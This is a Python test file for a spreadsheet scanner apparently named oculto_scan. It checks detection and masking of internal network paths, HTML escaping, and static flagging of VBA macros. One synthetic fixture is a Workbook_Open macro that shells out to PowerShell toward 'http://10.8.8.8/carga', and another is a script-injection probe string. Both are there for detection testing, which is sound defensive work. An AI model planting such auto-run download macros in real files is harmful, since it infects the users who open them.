"""Network map and static VBA reading. Fixtures are synthetic."""

import json

from oculto_scan.analyze import analyze
from oculto_scan.cli import main
from oculto_scan.models import NetworkHint
from oculto_scan.public import scan_bytes
from oculto_scan.report import render_html, render_json, render_text
from oculto_scan.workbook import load_workbook
from tests.vba_factory import build_vba_project
from tests.workbook_factory import build_workbook

_SCRIPT = "<script>alert(1)</script>"
_UNC = r"\\servidor-obra\orcamento\custo.xlsx"
_SHARE = "https://contoso.sharepoint.com/sites/obra/custo.xlsx"
_USER_PATH = r"C:\Users\obra.sintetica\Desktop\margem.xlsx"
_LINK = r"\\servidor-vinculo\custos\base.xlsx"
_COMMENT = r"ver \\servidor-comentario\pasta\nota.xlsx"
_PRINTER = r"\\servidor\impressoras\HP-Obra"
_CONN = "Provider=SQLOLEDB;Data Source=sql-obra;Initial Catalog=obra"

_SUSPICIOUS = (
    "Private Sub Workbook_Open()\r\n"
    '    Shell "powershell.exe -nop -c http://10.8.8.8/carga"\r\n'
    '    CreateObject("WScript.Shell")\r\n'
    r"    ' \\servidor-macro\pasta\payload.xlsx" + "\r\n"
    "End Sub\r\n"
)
_BENIGN = "Function Dobro(x)\r\n    Dobro = x * 2\r\nEnd Function\r\n"


def _network_book(path):
    build_workbook(
        path,
        [
            {
                "name": "Proposta",
                "cells": [
                    {"ref": "A1", "value": "quantidade 12"},
                    {"ref": "B2", "value": _UNC},
                    {"ref": "C2", "value": _USER_PATH},
                    {"ref": "D2", "value": _SHARE},
                ],
                "comments": [{"ref": "A1", "author": "Ana", "text": _COMMENT}],
            }
        ],
        metadata={"creator": r"OBRA\ana.sintetica"},
        defined_names=[{"name": "Origem", "formula": r"'\\servidor-nome\pasta\[custo.xlsx]Custos'!A1"}],
        external_target=_LINK,
        connections=_CONN,
        printer_settings=_PRINTER.encode("utf-16le"),
        persons=[{"name": r"OBRA\pedro.sintetico", "userId": "pedro@exemplo.test"}],
    )


def _kinds(path):
    workbook = load_workbook(path)
    findings = analyze(workbook, path.name)
    return workbook, findings


def test_network_map_groups_signals_and_skips_duplicates(tmp_path):
    path = tmp_path / "mapa.xlsx"
    _network_book(path)
    workbook, findings = _kinds(path)
    hints = workbook.network_hints
    by_kind = {}
    for hint in hints:
        by_kind.setdefault(hint.kind, set()).add(hint.evidence_raw)

    assert _UNC in by_kind["unc"]
    assert _LINK in by_kind["unc"]
    assert _USER_PATH in by_kind["caminho"]
    assert "obra.sintetica" in by_kind["usuario"]
    assert r"obra\orcamento" not in by_kind["usuario"]
    assert r"OBRA\ana.sintetica" in by_kind["usuario"]
    assert r"OBRA\pedro.sintetico" in by_kind["usuario"]
    assert _SHARE in by_kind["sharepoint"]
    assert _PRINTER in by_kind["impressora"]
    assert "sql-obra" in by_kind["maquina"]
    assert "servidor-obra" in by_kind["maquina"]
    assert _PRINTER not in by_kind.get("unc", set())
    assert "Desktop" not in " ".join(by_kind["usuario"])

    promoted = [item for item in findings if item.rule == "mapa-rede"]
    promoted_raw = {item.evidence_raw for item in promoted}
    assert _UNC in promoted_raw
    assert any(item.evidence_raw == _UNC and item.risk == "alto" for item in promoted)
    assert any(item.evidence_raw == _SHARE and item.risk == "alto" for item in promoted)
    assert _LINK not in promoted_raw
    assert r"OBRA\ana.sintetica" not in promoted_raw
    assert "servidor-obra" not in promoted_raw
    assert r"OBRA\pedro.sintetico" in promoted_raw


def test_plain_sheet_has_no_network_hints(tmp_path, capsys):
    path = tmp_path / "quantidade.xlsx"
    build_workbook(path, [{"name": "Proposta", "cells": [{"ref": "A1", "value": "quantidade 12"}]}])
    workbook, findings = _kinds(path)
    assert workbook.network_hints == []
    assert not any(item.rule == "mapa-rede" for item in findings)
    code = main([str(path)])
    text = capsys.readouterr().out
    assert code == 0
    assert "Mapa da rede" in text
    assert "Nenhum indício de rede interna." in text


def test_show_reveals_map_in_text_and_html_but_not_json(tmp_path, capsys, monkeypatch):
    monkeypatch.chdir(tmp_path)
    path = tmp_path / "mapa.xlsx"
    _network_book(path)
    code = main([str(path), "--no-color"])
    masked = capsys.readouterr().out
    assert code == 1
    assert "Mapa da rede" in masked
    assert _UNC not in masked
    assert "obra.sintetica" not in masked
    assert "/sites/obra" not in masked
    assert "contoso.sharepoint.com" in masked
    assert "sql-obra" not in masked

    code = main([str(path), "--show", "--no-color"])
    revealed = capsys.readouterr().out
    assert code == 1
    assert _UNC in revealed
    assert _SHARE in revealed
    assert "obra.sintetica" in revealed

    code = main([str(path), "--show", "--format", "json"])
    raw = capsys.readouterr().out
    payload = json.loads(raw)
    assert code == 1
    assert _UNC not in raw
    assert "/sites/obra" not in raw
    assert "contoso.sharepoint.com" in raw
    assert payload["mapa_da_rede"]
    assert all(item["valor"] != _UNC for item in payload["mapa_da_rede"])
    assert not any(item["rule"] == "mapa-rede" for item in payload["findings"])

    code = main([str(path), "--format", "html", "--output", "mapa.html"])
    page = (tmp_path / "mapa.html").read_text(encoding="utf-8")
    assert code == 1
    assert "Mapa da rede" in page
    assert "Content-Security-Policy" in page
    assert _UNC not in page
    assert "/sites/obra" not in page
    capsys.readouterr()


def test_html_escapes_network_fields(tmp_path):
    hint = NetworkHint(
        file="a<b>.xlsx",
        sheet=_SCRIPT,
        cell="A1",
        kind="unc",
        type_label=_SCRIPT,
        risk="alto",
        message=_SCRIPT,
        evidence_masked=r"\\s***",
        evidence_raw=_SCRIPT,
        source="célula",
    )
    page = render_html(
        [],
        ignored=0,
        scanned=1,
        files=["a<b>.xlsx"],
        show=True,
        network=[hint],
    )
    assert "Content-Security-Policy" in page
    assert "default-src 'none'" in page
    assert "<script" not in page.lower()
    assert page.lower().count("&lt;script&gt;") >= 4
    assert "Mapa da rede" in page
    text = render_text([], show=True, ignored=0, scanned=1, network=[hint])
    assert _SCRIPT in text
    safe = NetworkHint(
        file="mapa.xlsx",
        sheet="Proposta",
        cell="B2",
        kind="unc",
        type_label="caminho UNC",
        risk="alto",
        message="Caminho de rede.",
        evidence_masked=r"\\s***",
        evidence_raw=_SCRIPT,
        source="célula",
    )
    raw = render_json([], ignored=0, scanned=1, network=[safe])
    assert _SCRIPT not in raw
    assert r"\\s***" in raw


def test_suspicious_macro_is_listed_and_not_executed(tmp_path, capsys):
    path = tmp_path / "com-macro.xlsm"
    build_workbook(
        path,
        [{"name": "Proposta", "cells": [{"ref": "A1", "value": "quantidade 12"}]}],
        vba_blob=build_vba_project(_SUSPICIOUS),
    )
    _workbook, findings = _kinds(path)
    rules = {item.rule for item in findings}
    assert "macro" in rules
    assert "macro-suspeita" in rules
    assert "macro-ioc" in rules
    assert "nao-analisado" not in rules
    words = {item.evidence_masked for item in findings if item.rule == "macro-suspeita"}
    assert "Workbook_Open" in words
    assert "Shell" in words
    assert "PowerShell" in words
    assert "CreateObject" in words
    assert "WScript" in words
    assert any(item.risk == "alto" and item.rule == "macro-suspeita" for item in findings)
    assert any(item.evidence_raw == "http://10.8.8.8/carga" for item in findings)
    assert any(item.evidence_raw == r"\\servidor-macro\pasta\payload.xlsx" for item in findings)
    macro = next(item for item in findings if item.rule == "macro")
    assert "não foi testada" in macro.message
    assert "Modulo1" in macro.message
    assert "não execut" in macro.message or "sem executar" in macro.message

    code = main([str(path), "--no-color"])
    text = capsys.readouterr().out
    assert code == 1
    assert "Workbook_Open" in text
    assert "http://10.8.8.8/carga" not in text
    assert "servidor-macro" not in text


def test_benign_macro_does_not_flag_shell(tmp_path):
    path = tmp_path / "dobro.xlsm"
    build_workbook(
        path,
        [{"name": "Proposta", "cells": [{"ref": "A1", "value": "quantidade 12"}]}],
        vba_blob=build_vba_project(_BENIGN),
    )
    _workbook, findings = _kinds(path)
    assert any(item.rule == "macro" and "Modulo1" in item.message for item in findings)
    assert not any(item.rule == "macro-suspeita" for item in findings)
    assert not any(item.rule == "nao-analisado" for item in findings)


def test_missing_oletools_is_exit_3(tmp_path, monkeypatch, capsys):
    path = tmp_path / "sem-extra.xlsm"
    build_workbook(
        path,
        [{"name": "Proposta", "cells": [{"ref": "A1", "value": "quantidade 12"}]}],
        vba_blob=build_vba_project(_BENIGN),
    )
    real_import = __import__

    def _blocked(name, globals=None, locals=None, fromlist=(), level=0):
        if name == "oletools" or name.startswith("oletools."):
            raise ImportError("oletools ausente")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr("builtins.__import__", _blocked)
    code = main([str(path), "--no-color"])
    text = capsys.readouterr().out
    assert code == 3
    assert "oculto-scan[macro]" in text
    assert "não foi analisada" in text or "Não analisado" in text
    assert "Workbook_Open" not in text


def test_diff_reports_macro_presence(tmp_path, capsys):
    original = tmp_path / "original.xlsx"
    received = tmp_path / "recebido.xlsm"
    sheets = [{"name": "Proposta", "cells": [{"ref": "A1", "value": "quantidade 12"}]}]
    build_workbook(original, sheets)
    build_workbook(received, sheets, vba_blob=b"nao-e-um-projeto")
    code = main(["diff", str(original), str(received), "--no-color"])
    text = capsys.readouterr().out
    assert code == 1
    assert "Macro presente só na planilha recebida." in text
    assert ".xlsm" in text or "recebido.xlsm" in text


def test_scan_bytes_includes_map_and_escapes(tmp_path):
    path = tmp_path / "mapa.xlsx"
    _network_book(path)
    page = scan_bytes("mapa.xlsx", path.read_bytes(), show=False)
    assert "Mapa da rede" in page
    assert _UNC not in page
    assert "<script" not in page.lower()
    assert "Content-Security-Policy" in page
